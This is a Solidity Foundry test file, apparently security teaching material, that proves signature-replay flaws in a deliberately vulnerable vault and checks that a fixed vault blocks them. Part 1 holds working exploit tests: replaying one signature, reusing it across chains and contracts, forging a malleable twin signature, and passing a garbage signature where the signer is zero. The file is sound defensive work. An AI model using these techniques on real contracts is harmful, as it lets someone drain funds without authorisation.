// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnerableSigVault} from "../src/vulnerable/VulnerableSigVault.sol";
import {SafeSigVault} from "../src/fixed/SafeSigVault.sol";

/// ES-01  Signature replay.  Part 1 = exploits on the vulnerable vault, part 2 = same attacks on the fixed vault.
contract SignatureReplayTest is Test {
    // secp256k1 group order, needed to build a malleable twin signature
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    VulnerableSigVault vuln;
    SafeSigVault safe;
    address signer;
    uint256 signerPk;
    address bob = makeAddr("bob");

    function setUp() public {
        (signer, signerPk) = makeAddrAndKey("signer");
        vuln = new VulnerableSigVault{value: 10 ether}(signer);
        safe = new SafeSigVault{value: 10 ether}(signer);
    }

    // ---------- helpers ----------
    function _signLegacy(address to, uint256 amount) internal view returns (uint8 v, bytes32 r, bytes32 s) {
        bytes32 h = keccak256(abi.encodePacked(to, amount));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", h));
        (v, r, s) = vm.sign(signerPk, digest);
    }

    function _signSafe(SafeSigVault vault, address to, uint256 amount, uint256 nonce, uint256 deadline)
        internal
        view
        returns (bytes memory)
    {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, vault.hashWithdraw(to, amount, nonce, deadline));
        return abi.encodePacked(r, s, v);
    }

    // =====================================================================
    //  PART 1 - EXPLOITS (these tests PASS = the flaw is proven)
    // =====================================================================

    /// The signer authorised ONE withdrawal of 1 ether. Bob drains 5 ether with the same signature.
    function test_exploit_replaySameSignature() public {
        (uint8 v, bytes32 r, bytes32 s) = _signLegacy(bob, 1 ether);
        for (uint256 i; i < 5; i++) {
            vuln.withdraw(payable(bob), 1 ether, v, r, s);
        }
        assertEq(bob.balance, 5 ether, "5 withdrawals with 1 signature");
        assertEq(address(vuln).balance, 5 ether);
    }

    /// Same signature accepted by a second vault (other chain / other deployment / L2 fork).
    function test_exploit_crossChainAndCrossContractReplay() public {
        (uint8 v, bytes32 r, bytes32 s) = _signLegacy(bob, 1 ether);

        vm.chainId(1); // "mainnet" copy
        vuln.withdraw(payable(bob), 1 ether, v, r, s);

        vm.chainId(137); // another chain, another deployment of the same code + same signer
        VulnerableSigVault otherChainVault = new VulnerableSigVault{value: 10 ether}(signer);
        otherChainVault.withdraw(payable(bob), 1 ether, v, r, s);

        assertEq(bob.balance, 2 ether, "one signature paid on two chains");
    }

    /// A DIFFERENT valid-looking signature (s' = n - s, v' flipped) for the SAME message.
    /// => "remember used signatures" is NOT a valid replay defence. Nonces are.
    function test_exploit_malleableSignature() public {
        (uint8 v, bytes32 r, bytes32 s) = _signLegacy(bob, 1 ether);
        uint8 v2 = v == 27 ? 28 : 27;
        bytes32 s2 = bytes32(N - uint256(s));

        vuln.withdraw(payable(bob), 1 ether, v, r, s);
        vuln.withdraw(payable(bob), 1 ether, v2, r, s2); // different bytes, same signer approval
        assertEq(bob.balance, 2 ether);
    }

    /// ecrecover returns address(0) for invalid input. With an unset signer anyone can drain the vault.
    function test_exploit_zeroSignerAcceptsGarbage() public {
        VulnerableSigVault broken = new VulnerableSigVault{value: 3 ether}(address(0));
        broken.withdraw(payable(bob), 3 ether, 0, bytes32(0), bytes32(0)); // no valid signature at all
        assertEq(bob.balance, 3 ether);
    }

    // =====================================================================
    //  PART 2 - SAME ATTACKS AGAINST THE FIXED VAULT (all must be blocked)
    // =====================================================================

    function test_fixed_legitimateWithdrawalsWork() public {
        uint256 deadline = block.timestamp + 1 hours;
        bytes memory sig0 = _signSafe(safe, bob, 1 ether, 0, deadline);
        safe.withdraw(payable(bob), 1 ether, deadline, sig0);
        assertEq(safe.nonces(bob), 1);

        // a new, fresh authorisation (nonce 1) works
        bytes memory sig1 = _signSafe(safe, bob, 2 ether, 1, deadline);
        safe.withdraw(payable(bob), 2 ether, deadline, sig1);
        assertEq(bob.balance, 3 ether);
    }

    function test_fixed_replayReverts() public {
        uint256 deadline = block.timestamp + 1 hours;
        bytes memory sig = _signSafe(safe, bob, 1 ether, 0, deadline);
        safe.withdraw(payable(bob), 1 ether, deadline, sig);

        vm.expectRevert("bad sig"); // nonce is now 1, the signed digest used nonce 0
        safe.withdraw(payable(bob), 1 ether, deadline, sig);
        assertEq(bob.balance, 1 ether);
    }

    function test_fixed_expiredSignatureReverts() public {
        uint256 deadline = block.timestamp + 1 hours;
        bytes memory sig = _signSafe(safe, bob, 1 ether, 0, deadline);
        vm.warp(deadline + 1);
        vm.expectRevert("expired");
        safe.withdraw(payable(bob), 1 ether, deadline, sig);
    }

    function test_fixed_otherChainReverts() public {
        uint256 deadline = block.timestamp + 1 hours;
        bytes memory sig = _signSafe(safe, bob, 1 ether, 0, deadline); // signed for chain 31337
        vm.chainId(137); // OZ EIP712 recomputes the domain separator when chainid changes
        vm.expectRevert("bad sig");
        safe.withdraw(payable(bob), 1 ether, deadline, sig);
    }

    function test_fixed_otherContractInstanceReverts() public {
        SafeSigVault twin = new SafeSigVault{value: 10 ether}(signer); // same code, same signer, other address
        uint256 deadline = block.timestamp + 1 hours;
        bytes memory sig = _signSafe(safe, bob, 1 ether, 0, deadline);
        safe.withdraw(payable(bob), 1 ether, deadline, sig);
        vm.expectRevert("bad sig"); // verifyingContract is part of the domain
        twin.withdraw(payable(bob), 1 ether, deadline, sig);
    }

    function test_fixed_malleableSignatureRejected() public {
        uint256 deadline = block.timestamp + 1 hours;
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, safe.hashWithdraw(bob, 1 ether, 0, deadline));
        uint8 v2 = v == 27 ? 28 : 27;
        bytes32 s2 = bytes32(N - uint256(s));
        vm.expectRevert(); // OZ: ECDSAInvalidSignatureS (high-s values are refused)
        safe.withdraw(payable(bob), 1 ether, deadline, abi.encodePacked(r, s2, v2));
    }

    function test_fixed_zeroSignerRejectedAtDeploy() public {
        vm.expectRevert("zero signer");
        new SafeSigVault(address(0));
    }

    function test_fixed_tamperedAmountReverts() public {
        uint256 deadline = block.timestamp + 1 hours;
        bytes memory sig = _signSafe(safe, bob, 1 ether, 0, deadline);
        vm.expectRevert("bad sig");
        safe.withdraw(payable(bob), 5 ether, deadline, sig);
    }

    // =====================================================================
    //  FUZZ
    // =====================================================================

    /// For any amount / deadline, a signature pays at most once.
    function testFuzz_fixed_signatureUsableOnlyOnce(uint96 amount, uint32 ttl) public {
        amount = uint96(bound(amount, 1, 10 ether));
        uint256 deadline = block.timestamp + bound(ttl, 1, 365 days);
        bytes memory sig = _signSafe(safe, bob, amount, 0, deadline);
        safe.withdraw(payable(bob), amount, deadline, sig);
        vm.expectRevert("bad sig");
        safe.withdraw(payable(bob), amount, deadline, sig);
        assertEq(bob.balance, amount);
    }

    /// Fuzzing the vulnerable vault shows the opposite: replay ALWAYS works.
    function testFuzz_exploit_vulnerableAlwaysReplayable(uint96 amount) public {
        amount = uint96(bound(amount, 1, 5 ether));
        (uint8 v, bytes32 r, bytes32 s) = _signLegacy(bob, amount);
        vuln.withdraw(payable(bob), amount, v, r, s);
        vuln.withdraw(payable(bob), amount, v, r, s);
        assertEq(bob.balance, uint256(amount) * 2);
    }
}
